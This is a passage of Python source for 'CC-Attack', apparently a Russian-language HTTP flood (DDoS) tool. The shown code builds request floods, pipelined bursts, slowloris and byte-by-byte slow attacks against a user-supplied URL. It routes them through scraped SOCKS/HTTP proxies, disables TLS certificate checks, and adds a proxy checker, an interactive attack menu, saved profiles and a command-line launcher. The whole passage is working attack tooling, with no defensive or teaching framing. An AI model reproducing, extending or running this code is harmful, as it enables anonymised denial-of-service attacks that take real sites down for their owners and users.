            extra += "Upgrade: h2c\r\nConnection: Upgrade, HTTP2-Settings\r\n"
            extra += "HTTP2-Settings: AAMAAABkAAQAAP__\r\n"

        length_line = ""
        if "Transfer-Encoding" not in extra:
            length_line = f"Content-Length: {len(body)}\r\n"

        lines = (
            f"{m} {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"{acc}"
            f"{ctype}"
            f"{extra}"
            f"{ref}"
            f"{ua}"
            f"{length_line}"
            f"{conn}"
        )
        return lines + "\r\n" + body + "\r\n\r\n"

    def _open(self, host: str, port: int) -> socket.socket:
        s = socks.socksocket()
        if self.proxy_type == 4:
            s.set_proxy(socks.SOCKS4, host, port)
        elif self.proxy_type == 5:
            s.set_proxy(socks.SOCKS5, host, port)
        else:
            s.set_proxy(socks.HTTP, host, port)

        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except OSError:
            pass
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_SNDBUF)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCKET_RCVBUF)
        except OSError:
            pass
        if hasattr(socket, "TCP_FASTOPEN"):
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 5)
            except OSError:
                pass

        s.settimeout(CONNECT_TIMEOUT)
        s.connect((self.target, self.port))
        if self.protocol == "https":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.target)
        try:
            s.settimeout(SEND_TIMEOUT)
        except OSError:
            pass
        return s

    def _build_one(self) -> str:
        m = self._resolve_method()
        if m in ("POST", "PUT", "PATCH", "DELETE"):
            return self._build_header(m)
        if self.method in ("GET", "HEAD", "OPTIONS", "TRACE", "CONNECT") \
                and self.technique in ("flood", "pipeline", "mixed", "random"):
            if m == "HEAD":
                hdr = self._rand_header()
                return (f"HEAD {self.path}{self._sep}"
                        f"{random.randint(0, 271400281257)} "
                        f"HTTP/1.1\r\n{self._host_line}{hdr}")
            hdr = self._rand_header()
            return (f"{m} {self.path}{self._sep}"
                    f"{random.randint(0, 271400281257)} "
                    f"HTTP/1.1\r\n{self._host_line}{hdr}")
        return self._build_header(m)

    def _build_batch(self, n: int) -> bytes:
        return "".join(self._build_one() for _ in range(n)).encode("utf-8", "ignore")

    def _attack_pipeline(self, s: socket.socket) -> bool:
        depth = self.pipeline_depth
        keepalive = self.keepalive_per_socket
        sent_on_socket = 0
        while sent_on_socket < keepalive and not self.stop.is_set():
            batch = self._build_batch(depth)
            try:
                s.sendall(batch)
            except (socket.timeout, BrokenPipeError,
                    ConnectionResetError, OSError):
                return False
            sent_on_socket += depth
            self._stat(sent=depth, nbytes=len(batch))
        return True

    def _attack_slow(self, s: socket.socket) -> bool:
        m = self._resolve_method()
        req = self._build_header(m).encode("utf-8", "ignore")
        try:
            for byte in req:
                if self.stop.is_set():
                    return False
                s.sendall(bytes([byte]))
                if self.slow_delay > 0:
                    time.sleep(self.slow_delay)
            self._stat(sent=1, nbytes=len(req))
            return True
        except Exception:
            return False

    def _attack_slowloris(self, s: socket.socket) -> bool:
        m = self._resolve_method()
        try:
            head = (
                f"{m} {self.path}{self._sep}{random.randint(0, 271400281257)} "
                f"HTTP/1.1\r\n{self._host_line}"
            )
            s.sendall(head.encode("utf-8", "ignore"))
            for _ in range(500):
                if self.stop.is_set():
                    return False
                s.sendall(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                time.sleep(self.slow_delay)
            self._stat(sent=1)
            return True
        except Exception:
            return False

    def _attack_single(self, s: socket.socket) -> bool:
        req = self._build_one().encode("utf-8", "ignore")
        try:
            s.sendall(req)
            self._stat(sent=1, nbytes=len(req))
            return True
        except Exception:
            return False

    def run(self) -> None:
        self._ensure_headers()
        stop = self.stop

        while not stop.is_set():
            tech = self.technique
            if tech == "random":
                tech = random.choice(TECHNIQUES)
            elif tech == "mixed":
                tech = random.choice([
                    "flood", "pipeline", "gzip", "chunked", "range",
                ])

            try:
                host, port = self._pick_proxy()
            except ValueError:
                time.sleep(ERROR_BACKOFF * 10)
                continue

            s = None
            try:
                s = self._open(host, port)
                if tech in ("flood", "pipeline", "gzip", "chunked",
                            "range", "http2"):
                    self._attack_pipeline(s)
                elif tech == "slow":
                    self._attack_slow(s)
                elif tech == "slowloris":
                    self._attack_slowloris(s)
                else:
                    self._attack_single(s)
                try:
                    s.close()
                except Exception:
                    pass
            except Exception:
                self._stat(err=1)
                if s is not None:
                    try: s.close()
                    except Exception: pass
                if ERROR_BACKOFF > 0:
                    time.sleep(ERROR_BACKOFF)

# ─────────────────────────────────────────────────────────────────────────────
#  Прокси — загрузка / нормализация
# ─────────────────────────────────────────────────────────────────────────────
def _is_valid_proxy(host: str, port: int) -> bool:
    if not (0 < port < 65536):
        return False
    h = host.strip("[]")
    try:
        socket.inet_pton(socket.AF_INET, h)
        return True
    except OSError:
        pass
    try:
        socket.inet_pton(socket.AF_INET6, h)
        return True
    except OSError:
        return False


def download_proxies(proxy_ver: str, out_file: Path) -> None:
    src_key = {"4": "socks4", "5": "socks5", "http": "http"}.get(proxy_ver, "socks5")
    urls = BUILTIN_PROXY_SOURCES[src_key]
    Log.info(t("info_download", n=len(urls), kind=src_key))
    seen: set[str] = set()
    total = 0
    with out_file.open("w", encoding="utf-8") as f:
        for api in urls:
            try:
                r = requests.get(api, timeout=8,
                                 headers={"User-Agent": get_ua()})
                if r.status_code != 200:
                    continue
                for line in re.split(r"[\s,;|]+", r.text):
                    line = line.strip()
                    if not line:
                        continue
                    for m in _PROXY_RE.finditer(line):
                        host = m.group("ip4") or f"[{m.group('ip6')}]"
                        port = int(m.group("port"))
                        if not _is_valid_proxy(m.group("ip4") or m.group("ip6"), port):
                            continue
                        key = f"{host}:{port}"
                        if key in seen:
                            continue
                        seen.add(key)
                        f.write(key + "\n")
                        total += 1
            except Exception:
                continue
    Log.ok(t("ok_saved_proxy", n=total, path=out_file))


def normalize_proxy_file(path: Path) -> None:
    if not path.exists():
        return
    raw_text = path.read_text(encoding="utf-8", errors="ignore")
    seen: set[str] = set()
    keep: list[str] = []
    bad = 0
    for tok in re.split(r"[\s,;|\"'<>]+", raw_text):
        if not tok:
            continue
        matched = False
        for m in _PROXY_RE.finditer(tok):
            matched = True
            ip = m.group("ip4") or m.group("ip6")
            port = int(m.group("port"))
            if not _is_valid_proxy(ip, port):
                bad += 1
                continue
            key = f"[{ip}]:{port}" if ":" in ip else f"{ip}:{port}"
            if key in seen:
                continue
            seen.add(key)
            keep.append(key)
        if not matched and (":" in tok):
            bad += 1
    path.write_text("\n".join(keep) + ("\n" if keep else ""), encoding="utf-8")
    Log.info(t("info_normalized", n=len(keep), bad=bad))

# ─────────────────────────────────────────────────────────────────────────────
#  ⚡ Быстрый чекер прокси
# ─────────────────────────────────────────────────────────────────────────────
_CHECK_TARGETS = [
    ("1.1.1.1", 80, b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nConnection: close\r\n\r\n"),
    ("8.8.8.8", 53, b""),
]


def _check_one_fast(line: str, proxy_type: int, ms: int
                    ) -> tuple[str, int] | None:
    host, _, port = line.rpartition(":")
    if not host or not port:
        return None
    try:
        port_i = int(port)
    except ValueError:
        return None
    if not _is_valid_proxy(host.strip("[]"), port_i):
        return None

    pt = 4 if proxy_type == 4 else (5 if proxy_type == 5 else 0)
    t0 = time.perf_counter()

    for i, (thost, tport, probe) in enumerate(_CHECK_TARGETS):
        s = None
        try:
            s = socks.socksocket()
            if pt == 4:
                s.set_proxy(socks.SOCKS4, host.strip("[]"), port_i)
            elif pt == 5:
                s.set_proxy(socks.SOCKS5, host.strip("[]"), port_i)
            else:
                s.set_proxy(socks.HTTP, host.strip("[]"), port_i)
            s.settimeout(ms if i == 0 else ms + 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((thost, tport))
            if probe:
                s.sendall(probe)
                data = s.recv(64)
                if not data:
                    raise OSError("empty response")
            s.close()
            return (line, int((time.perf_counter() - t0) * 1000))
        except Exception:
            if s is not None:
                try: s.close()
                except Exception: pass
            continue
    return None


def check_proxies(proxies: list[str], proxy_type: int, ms: int = 3,
                  workers: int = 500,
                  autosave_path: Path | None = None,
                  autosave_every: int = 5) -> list[str]:
    Log.info(t("info_checking", n=len(proxies), ms=ms, w=workers))
    alive: list[tuple[str, int]] = []
    done = 0
    total = len(proxies)
    lock = threading.Lock()
    start = time.time()
    last_save = start
    stop_progress = threading.Event()

    def _progress_reporter():
        while not stop_progress.is_set():
            time.sleep(1)
            with lock:
                d, a = done, len(alive)
            elapsed = time.time() - start
            rps = d / elapsed if elapsed > 0 else 0
            eta = (total - d) / rps if rps > 0 else 0
            pct = (d / total * 100) if total else 100.0
            try:
                sys.stdout.write("\r" + t(
                    "check_progress", done=d, total=total, pct=pct,
                    alive=a, rps=rps, eta=int(eta),
                ))
                sys.stdout.flush()
            except Exception:
                pass

    reporter = threading.Thread(target=_progress_reporter, daemon=True)
    reporter.start()

    try:
        with cf.ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(_check_one_fast, p, proxy_type, ms): p
                       for p in proxies}
            for fut in cf.as_completed(futures):
                result = None
                try:
                    result = fut.result()
                except Exception:
                    result = None
                with lock:
                    done += 1
                    if result is not None:
                        alive.append(result)
                    now = time.time()
                    if (autosave_path is not None
                            and now - last_save >= autosave_every
                            and alive):
                        try:
                            autosave_path.write_text(
                                "\n".join(p for p, _ in alive) + "\n",
                                encoding="utf-8",
                            )
                            Log.info(t("check_autosave",
                                       n=len(alive), path=autosave_path))
                        except Exception:
                            pass
                        last_save = now
    finally:
        stop_progress.set()
        reporter.join(timeout=1)
        print()

    alive.sort(key=lambda x: x[1])
    only_proxies = [p for p, _ in alive]
    if autosave_path is not None and only_proxies:
        try:
            autosave_path.write_text(
                "\n".join(only_proxies) + "\n", encoding="utf-8"
            )
        except Exception:
            pass
    if total:
        Log.ok(t("ok_alive", n=len(only_proxies), total=total,
                 pct=len(only_proxies) / total * 100))
    else:
        Log.ok(t("ok_alive", n=0, total=0, pct=0.0))
    if alive:
        Log.info(t("ok_top", n=min(10, len(alive))))
        for rank, (proxy, latency) in enumerate(alive[:10], 1):
            print(t("ok_top_line", rank=rank, proxy=proxy, ms=latency))
    return only_proxies

# ─────────────────────────────────────────────────────────────────────────────
#  Профили
# ─────────────────────────────────────────────────────────────────────────────
def load_profiles() -> dict:
    if not PROFILES_FILE.exists():
        return {}
    try:
        return json.loads(PROFILES_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}


def save_profiles(data: dict) -> None:
    try:
        PROFILES_FILE.write_text(
            json.dumps(data, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )
    except Exception as e:
        Log.err(f"profiles.json: {e}")


def save_profile(name: str, args: dict) -> None:
    db = load_profiles()
    db[name] = args
    save_profiles(db)


def load_profile(name: str) -> dict | None:
    db = load_profiles()
    return db.get(name)

# ─────────────────────────────────────────────────────────────────────────────
#  Интерактивное меню
# ─────────────────────────────────────────────────────────────────────────────
def _ask(prompt: str, default: str = "", allow_empty: bool = True) -> str:
    try:
        val = input(f"{C.CYN}{prompt}{C.RESET}").strip()
    except (EOFError, KeyboardInterrupt):
        return default
    if val == "0":
        return "__CANCEL__"
    if val == "" and not allow_empty:
        return default
    return val if val != "" else default


def _ask_int(prompt: str, lo: int, hi: int) -> int | None:
    while True:
        raw = _ask(prompt)
        if raw == "__CANCEL__":
            return None
        try:
            v = int(raw)
        except ValueError:
            Log.err(t("err_int"))
            continue
        if not (lo <= v <= hi):
            Log.err(t("err_range", lo=lo, hi=hi))
            continue
        return v


def _ask_choice(prompt: str, options: list[str]) -> str | None:
    raw = _ask(prompt)
    if raw == "__CANCEL__":
        return None
    low = raw.lower()
    for opt in options:
        if opt.lower() == low:
            return opt
    Log.err(t("menu_unknown"))
    return None


def _hr(char: str = "─", width: int = 62) -> str:
    return f"{C.DIM}{char * width}{C.RESET}"


def _menu_line(num: str, label: str, value: str = "") -> str:
    num_s = f"{C.YEL}[{num:>2}]{C.RESET}"
    if value:
        return f"  {num_s} {label:<38} {C.GRN}{value}{C.RESET}"
    return f"  {num_s} {label}"


def menu_show(cfg: dict) -> None:
    print(f"\n{C.BOLD}{C.RED}╔{'═' * 62}╗{C.RESET}")
    print(f"{C.BOLD}{C.RED}║{C.RESET}{C.BOLD}{C.YEL}{t('menu_title'):^62}{C.RESET}{C.BOLD}{C.RED}║{C.RESET}")
    print(f"{C.BOLD}{C.RED}╚{'═' * 62}╝{C.RESET}")
    print(f"{C.DIM}  {t('menu_hint')}{C.RESET}\n")

    url_val    = cfg.get("url") or "—"
    mode_val   = cfg.get("mode", "cc")
    meth_val   = cfg.get("method", "GET")
    tech_val   = cfg.get("technique", "flood")
    proxy_val  = cfg.get("proxy_ver", "5")
    thr_val    = str(cfg.get("threads", 800))
    sec_val    = str(cfg.get("period", 60))
    pipe_val   = str(cfg.get("pipeline", PIPELINE_DEPTH))
    ka_val     = str(cfg.get("keepalive", KEEPALIVE_PER_SOCKET))
    file_val   = cfg.get("out_file", "proxy.txt")
    cook_val   = (cfg.get("cookies", "")[:18] + "…") if cfg.get("cookies") else "—"
    data_val   = cfg.get("data", "") or "—"
    brute_val  = "ON" if cfg.get("brute") else "OFF"
    down_val   = "YES" if cfg.get("down") else "NO"
    check_val  = "YES" if cfg.get("check") else "NO"
    to_val     = str(cfg.get("check_to", 3))
    w_val      = str(cfg.get("check_w", 500))
    lang_val   = cfg.get("lang", LANG).upper()

    print(_menu_line("1",  t("menu_1"),  url_val))
    print(_menu_line("2",  t("menu_2"),  mode_val))
    print(_menu_line("3",  t("menu_3"),  meth_val))
    print(_menu_line("4",  t("menu_4"),  tech_val))
    print(_menu_line("5",  t("menu_5"),  proxy_val))
    print(_menu_line("6",  t("menu_6"),  thr_val))
    print(_menu_line("7",  t("menu_7"),  sec_val))
    print(_menu_line("8",  t("menu_8"),  pipe_val))
    print(_menu_line("9",  t("menu_9"),  ka_val))
    print(_menu_line("10", t("menu_10"), file_val))
    print(_menu_line("11", t("menu_11"), cook_val))
    print(_menu_line("12", t("menu_12"), data_val))
    print(_menu_line("13", t("menu_13"), brute_val))
    print(_menu_line("14", t("menu_14"), down_val))
    print(_menu_line("15", t("menu_15"), check_val))
    print(_menu_line("16", t("menu_16"), to_val))
    print(_menu_line("17", t("menu_17"), w_val))
    print(_menu_line("18", t("menu_18"), lang_val))
    print(_hr())
    print(_menu_line("19", t("menu_19")))
    print(_menu_line("20", t("menu_20")))
    print(_menu_line("21", t("menu_21")))
    print(_menu_line("22", t("menu_22")))
    print(_hr())
    print(f"  {C.GRN}{C.BOLD}[23]{C.RESET} {C.GRN}{C.BOLD}{t('menu_23')}{C.RESET}")
    print(f"  {C.RED}[ 0]{C.RESET} {C.RED}{t('menu_0')}{C.RESET}")
    print(_hr())


def menu_show_current(cfg: dict) -> None:
    print(f"\n{C.BOLD}{C.YEL}─── {t('menu_current')} ───{C.RESET}")
    for k in ("url", "mode", "method", "technique", "proxy_ver",
              "threads", "period", "pipeline", "keepalive",
              "out_file", "cookies", "data", "brute",
              "down", "check", "check_to", "check_w", "lang"):
        print(f"  {C.CYN}{k:<12}{C.RESET} {cfg.get(k, '—')}")
    try:
        input(f"\n{C.DIM}{t('menu_press')}{C.RESET}")
    except (EOFError, KeyboardInterrupt):
        pass


def menu_profiles_list() -> None:
    db = load_profiles()
    print(f"\n{C.BOLD}{C.YEL}─── {t('menu_prof_list')} ───{C.RESET}")
    if not db:
        print(f"  {C.DIM}{t('menu_prof_none')}{C.RESET}")
    else:
        for name in sorted(db.keys()):
            url = db[name].get("url", "—")
            print(f"  {C.GRN}•{C.RESET} {C.BOLD}{name}{C.RESET}  {C.DIM}{url}{C.RESET}")
    try:
        input(f"\n{C.DIM}{t('menu_press')}{C.RESET}")
    except (EOFError, KeyboardInterrupt):
        pass


def menu_run(cfg: dict, base_args: argparse.Namespace) -> int:
    if not cfg.get("url"):
        Log.err(t("err_no_url"))
        return 1

    print(f"\n{C.BOLD}{C.YEL}─── {t('menu_summary')} ───{C.RESET}")
    for k in ("url", "mode", "method", "technique", "proxy_ver",
              "threads", "period", "pipeline", "keepalive", "down", "check"):
        print(f"  {C.CYN}{k:<12}{C.RESET} {cfg.get(k, '—')}")
    try:
        ans = input(f"\n{C.GRN}{t('menu_confirm')}{C.RESET}").strip().lower()
    except (EOFError, KeyboardInterrupt):
        ans = "n"
    if ans not in ("", "y", "yes", "д", "да"):
        print(t("menu_aborted"))
        return 0

    ns = argparse.Namespace(
        help=False,
        url=cfg["url"],
        mode=cfg.get("mode", "cc"),
        method=cfg.get("method", "GET"),
        technique=cfg.get("technique", "flood"),
        slow_delay=cfg.get("slow_delay", SLOW_DELAY_DEFAULT),
        with_data=cfg.get("with_data", False),
        proxy_ver=cfg.get("proxy_ver", "5"),
        threads=cfg.get("threads", 800),
        out_file=cfg.get("out_file", "proxy.txt"),
        period=cfg.get("period", 60),
        brute="1" if cfg.get("brute") else "0",
        data=cfg.get("data", "") or None,
        cookies=cfg.get("cookies", ""),
        down=cfg.get("down", False),
        check=cfg.get("check", False),
        check_to=cfg.get("check_to", 3),
        check_w=cfg.get("check_w", 500),
        pipeline=cfg.get("pipeline", PIPELINE_DEPTH),
        keepalive=cfg.get("keepalive", KEEPALIVE_PER_SOCKET),
        log_file=cfg.get("log_file"),
        lang=cfg.get("lang", LANG),
    )
    return run_attack(ns)


def interactive_menu(base_args: argparse.Namespace) -> int:
    cfg = {
        "url": "",
        "mode": base_args.mode,
        "method": base_args.method,
        "technique": base_args.technique,
        "slow_delay": base_args.slow_delay,
        "with_data": base_args.with_data,
        "proxy_ver": base_args.proxy_ver,
        "threads": base_args.threads,
        "period": base_args.period,
        "pipeline": base_args.pipeline,
        "keepalive": base_args.keepalive,
        "out_file": base_args.out_file,
        "cookies": base_args.cookies,
        "data": base_args.data or "",
        "brute": base_args.brute == "1",
        "down": base_args.down,
        "check": base_args.check,
        "check_to": base_args.check_to,
        "check_w": base_args.check_w,
        "log_file": base_args.log_file,
        "lang": base_args.lang or LANG,
    }

    while True:
        menu_show(cfg)
        try:
            choice = input(f"{C.BOLD}{C.YEL}▶ {t('menu_choice')}:{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0

        if choice in ("0", "q", "exit", "quit"):
            print(f"{C.GRN}{t('menu_goodbye')}{C.RESET}")
            return 0

        elif choice == "1":
            v = _ask(t("menu_enter_url"))
            if v == "__CANCEL__": continue
            if not v.startswith(("http://", "https://")):
                Log.err(t("err_url_prefix")); continue
            cfg["url"] = v

        elif choice == "2":
            v = _ask_choice(t("menu_enter_mode"), ["cc", "post", "head"])
            if v: cfg["mode"] = v

        elif choice == "3":
            v = _ask_choice(t("menu_enter_meth"), HTTP_METHODS + ["RANDOM"])
            if v: cfg["method"] = v

        elif choice == "4":
            v = _ask_choice(t("menu_enter_tech"), TECHNIQUES)
            if v: cfg["technique"] = v

        elif choice == "5":
            v = _ask_choice(t("menu_enter_prox"), ["4", "5", "http"])
            if v: cfg["proxy_ver"] = v

        elif choice == "6":
            v = _ask_int(t("menu_enter_thr"), 1, 5000)
            if v is not None: cfg["threads"] = v

        elif choice == "7":
            v = _ask_int(t("menu_enter_sec"), 1, 86400)
            if v is not None: cfg["period"] = v

        elif choice == "8":
            v = _ask_int(t("menu_enter_pipe"), 1, 64)
            if v is not None: cfg["pipeline"] = v

        elif choice == "9":
            v = _ask_int(t("menu_enter_ka"), 1, 10000)
            if v is not None: cfg["keepalive"] = v

        elif choice == "10":
            v = _ask(t("menu_enter_file"))
            if v == "__CANCEL__": continue
            if v: cfg["out_file"] = v

        elif choice == "11":
            v = _ask(t("menu_enter_cook"))
            if v == "__CANCEL__": continue
            if v == "-": cfg["cookies"] = ""
            else: cfg["cookies"] = v

        elif choice == "12":
            v = _ask(t("menu_enter_data"))
            if v == "__CANCEL__": continue
            if v == "-": cfg["data"] = ""
            else: cfg["data"] = v

        elif choice == "13":
            raw = _ask(t("menu_enter_toggle"))
            if raw == "__CANCEL__": continue
            if raw in ("1", "on", "yes", "y", "д", "да"): cfg["brute"] = True
            elif raw in ("0", "off", "no", "n", "н", "нет"): cfg["brute"] = False

        elif choice == "14":
            raw = _ask(t("menu_enter_toggle"))
            if raw == "__CANCEL__": continue
            if raw in ("1", "on", "yes", "y", "д", "да"): cfg["down"] = True
            elif raw in ("0", "off", "no", "n", "н", "нет"): cfg["down"] = False

        elif choice == "15":
            raw = _ask(t("menu_enter_toggle"))
            if raw == "__CANCEL__": continue
            if raw in ("1", "on", "yes", "y", "д", "да"): cfg["check"] = True
            elif raw in ("0", "off", "no", "n", "н", "нет"): cfg["check"] = False

        elif choice == "16":
            v = _ask_int(t("menu_enter_to"), 1, 60)
            if v is not None: cfg["check_to"] = v

        elif choice == "17":
            v = _ask_int(t("menu_enter_w"), 1, 2000)
            if v is not None: cfg["check_w"] = v

        elif choice == "18":
            v = _ask_choice(t("menu_enter_lang"), ["ru", "en"])
            if v:
                cfg["lang"] = v
                select_language(v)

        elif choice == "19":
            menu_show_current(cfg)

        elif choice == "20":
            name = _ask(t("menu_enter_save"))
            if name == "__CANCEL__" or not name: continue
            save_profile(name, dict(cfg))
            Log.ok(t("menu_saved", n=name))

        elif choice == "21":
            name = _ask(t("menu_enter_load"))
            if name == "__CANCEL__" or not name: continue
            prof = load_profile(name)
            if prof is None:
                Log.err(t("menu_noprofile", n=name))
                continue
            cfg.update(prof)
            if prof.get("lang"):
                select_language(prof["lang"])
            Log.ok(t("menu_loaded", n=name))

        elif choice == "22":
            menu_profiles_list()

        elif choice == "23":
            return menu_run(cfg, base_args)

        else:
            Log.warn(t("menu_unknown"))

# ─────────────────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="cc.py",
        description="CC-Attack v" + VERSION + " by DIDO",
        add_help=False,
    )
    p.add_argument("-h", "-help", "--help", action="store_true", dest="help")
    p.add_argument("-url",  metavar="URL")
    p.add_argument("-m", "-mode", dest="mode",
                   choices=("cc", "post", "head"), default="cc")
    p.add_argument("-method", dest="method", default="GET")
    p.add_argument("-technique", dest="technique", default="flood")
    p.add_argument("-slow-delay", dest="slow_delay", type=float,
                   default=SLOW_DELAY_DEFAULT)
    p.add_argument("-with-data", dest="with_data", action="store_true")
    p.add_argument("-v", dest="proxy_ver", choices=("4", "5", "http"),
                   default="5")
    p.add_argument("-t", dest="threads", type=int, default=800)
    p.add_argument("-f", dest="out_file", default="proxy.txt")
    p.add_argument("-s", dest="period", type=int, default=60)
    p.add_argument("-b", dest="brute", choices=("0", "1"), default="0")
    p.add_argument("-data", dest="data")
    p.add_argument("-cookies", dest="cookies", default="")
    p.add_argument("-down", action="store_true")
    p.add_argument("-check", action="store_true")
    p.add_argument("-check-to", dest="check_to", type=int, default=3)
    p.add_argument("-check-w", dest="check_w", type=int, default=500)
    p.add_argument("-pipeline", dest="pipeline", type=int,
                   default=PIPELINE_DEPTH)
    p.add_argument("-keepalive", dest="keepalive", type=int,
                   default=KEEPALIVE_PER_SOCKET)
    p.add_argument("-log", dest="log_file")
    p.add_argument("-lang", dest="lang", choices=("ru", "en"))
    p.add_argument("-menu", action="store_true")
    p.add_argument("-profile", dest="profile")
    p.add_argument("-save-profile", dest="save_profile")
    return p


def print_help() -> None:
    L = TEXTS[LANG]
    title = L["help_title"]
    print(f"""{C.BOLD}{C.YEL}CC-Attack v{VERSION}{C.RESET}  —  {title}

  {C.CYN}-url{C.RESET}        <URL>          {L['help_url']}
  {C.CYN}-m{C.RESET}          cc|post|head   {L['help_mode']}
  {C.CYN}-method{C.RESET}     <M>            {L['help_method']}
  {C.CYN}-technique{C.RESET}  <T>            {L['help_technique']}
  {C.CYN}-v{C.RESET}          4|5|http       {L['help_proxy']}
  {C.CYN}-t{C.RESET}          <N>            {L['help_threads']}
  {C.CYN}-s{C.RESET}          <sec>          {L['help_period']}
  {C.CYN}-b{C.RESET}          0|1            {L['help_brute']}
  {C.CYN}-f{C.RESET}          <file>         {L['help_file']}
  {C.CYN}-data{C.RESET}       <file>         {L['help_data']}
  {C.CYN}-with-data{C.RESET}                 {L['help_with_data']}
  {C.CYN}-slow-delay{C.RESET} <sec>          {L['help_slow_delay']}
  {C.CYN}-cookies{C.RESET}    'a=1;b=2'      {L['help_cookies']}
  {C.CYN}-pipeline{C.RESET}   <1..64>        {L['help_pipeline']}
  {C.CYN}-keepalive{C.RESET}  <1..10000>     {L['help_keepalive']}
  {C.CYN}-down{C.RESET}                      {L['help_down']}
  {C.CYN}-check{C.RESET}                     {L['help_check']}
  {C.CYN}-check-to{C.RESET}   <sec>          {L['help_check_to']}
  {C.CYN}-check-w{C.RESET}    <N>            {L['help_check_w']}
  {C.CYN}-log{C.RESET}        <file>         {L['help_log']}
  {C.CYN}-lang{C.RESET}       ru|en          {L['help_lang']}
  {C.CYN}-menu{C.RESET}                      {L['help_menu']}
  {C.CYN}-profile{C.RESET}    <name>         {L['help_profile']}
  {C.CYN}-save-profile{C.RESET} <name>       {L['help_save_profile']}
  {C.CYN}-h{C.RESET}                         {L['help_help']}

{C.BOLD}Техники:{C.RESET} {', '.join(TECHNIQUES)}
{C.BOLD}Методы:{C.RESET}  {', '.join(HTTP_METHODS)}
""")

# ─────────────────────────────────────────────────────────────────────────────
#  run_attack
# ─────────────────────────────────────────────────────────────────────────────
def run_attack(args: argparse.Namespace) -> int:
    method_norm = args.method.upper()
    if method_norm not in HTTP_METHODS + ["RANDOM"]:
        Log.err(t("err_method", m=args.method,
                  avail="/".join(HTTP_METHODS + ["RANDOM"])))
        return 1
    if args.technique.lower() not in TECHNIQUES:
        Log.err(t("err_technique", t=args.technique,
                  avail="/".join(TECHNIQUES)))
        return 1

    if not args.url:
        Log.err(t("err_no_url"))
        return 1

    raw = args.url.strip()
    if raw.startswith("https://"):
        protocol, rest = "https", raw[8:]
    elif raw.startswith("http://"):
        protocol, rest = "http",  raw[7:]
    else:
        Log.err(t("err_url_prefix"))
        return 1

    hostport, _, tail = rest.partition("/")
    path = "/" + tail if tail else "/"
    if ":" in hostport:
        target, port_s = hostport.split(":", 1)
        port = int(port_s)
    else:
        target, port = hostport, (443 if protocol == "https" else 80)

    proxy_type = {"4": 4, "5": 5, "http": 0}[args.proxy_ver]
    out_file = Path(args.out_file)

    if args.down or not out_file.exists():
        download_proxies(args.proxy_ver, out_file)

    normalize_proxy_file(out_file)
    proxies = [l.strip() for l in out_file.read_text(
        encoding="utf-8", errors="ignore").splitlines() if l.strip()]

    if not proxies:
        Log.err(t("err_no_proxy"))
        return 1
    Log.ok(t("ok_proxy_count", n=len(proxies)))

    if args.check:
        proxies = check_proxies(
            proxies, proxy_type,
            ms=args.check_to, workers=args.check_w,
            autosave_path=out_file, autosave_every=5,
        )
        if not proxies:
            Log.err(t("err_no_alive"))
            return 1
        out_file.write_text("\n".join(proxies) + "\n", encoding="utf-8")

    post_data = ""
    if args.data:
        try:
            post_data = Path(args.data).read_text(
                encoding="utf-8", errors="ignore").replace("\n", " ")
        except OSError as e:
            Log.err(t("err_data_read", e=e))
            return 1

    Log.info(t("info_target", url=f"{protocol}://{target}:{port}{path}"))
    Log.info(t("info_mode", mode=args.mode, method=args.method,
               tech=args.technique))
    Log.info(t("info_perf", threads=args.threads,
               v=args.proxy_ver, p=args.pipeline))

    stop_event = threading.Event()

    def _shutdown(signum, frame):
        if stop_event.is_set():
            Log.warn(t("warn_force"))
            os._exit(1)
        Log.warn(t("warn_shutdown"))
        stop_event.set()

    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    pool_size = max(500, min(20000, 200 * args.threads))

    handler = CCHandler(
        target=target, path=path, port=port, protocol=protocol,
        proxies=proxies, proxy_type=proxy_type, cookies=args.cookies,
        post_data=post_data, brute=(args.brute == "1"),
        stop_event=stop_event,
        method=args.method,
        technique=args.technique,
        slow_delay=args.slow_delay,
        with_data=args.with_data,
        pipeline_depth=args.pipeline,
        keepalive_per_socket=args.keepalive,
        header_pool_size=pool_size,
    )

    Log.info(t("info_start"))
    threads = []
    for _ in range(args.threads):
        th = threading.Thread(target=handler.run, daemon=True)
        th.start()
        threads.append(th)

    start = time.time()
    try:
        while time.time() - start < args.period and not stop_event.is_set():
            time.sleep(1)
            elapsed = max(1e-6, time.time() - start)
            sent = handler.stats["sent"]
            sys.stdout.write("\r" + t(
                "progress",
                grn=C.GRN, rst=C.RESET, cyn=C.CYN, red=C.RED, yel=C.YEL,
                prp=C.PRP,
                el=int(elapsed), tot=args.period,
                sent=sent,
                err=handler.stats["errors"],
                mb=handler.stats["bytes"] / 1048576,
                rps=sent / elapsed,
            ))
            sys.stdout.flush()
    finally:
        stop_event.set()
        print()
        total_time = max(1e-6, time.time() - start)
        Log.ok(t("ok_done",
                 sent=handler.stats["sent"],
                 err=handler.stats["errors"],
                 mb=handler.stats["bytes"] / 1048576,
                 rps=handler.stats["sent"] / total_time))

    return 0

# ─────────────────────────────────────────────────────────────────────────────
#  main
# ─────────────────────────────────────────────────────────────────────────────
def main() -> int:
    pre = argparse.ArgumentParser(add_help=False)
    pre.add_argument("-lang", dest="lang", choices=("ru", "en"))
    pre_args, _ = pre.parse_known_args()

    select_language(pre_args.lang)
    print_banner()

    args = build_parser().parse_args()

    if args.help:
        print_help()
        return 0

    if args.log_file:
        logging.basicConfig(
            filename=args.log_file, level=logging.INFO,
